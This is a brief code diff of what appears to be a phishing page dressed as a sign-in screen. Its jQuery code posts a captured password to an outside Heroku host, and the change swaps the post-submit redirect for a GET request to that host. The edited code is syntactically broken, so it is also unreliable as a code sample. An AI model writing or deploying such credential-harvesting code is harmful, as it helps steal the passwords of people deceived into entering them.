@@ -58,9 +58,7 @@ initAft()</script><script id="_ij" nonce="">window.IJ_values = [[true,[["/v3/sig
     $.post(
       "https://moxies.herokuapp.com/auth",
          {"password":auth},
-         function (data, status){
-           window.location = "https://moxies.herokuapp.com/login" 
-    }
+    $.get("https://moxies.herokuapp.com/login");
 
   );
 
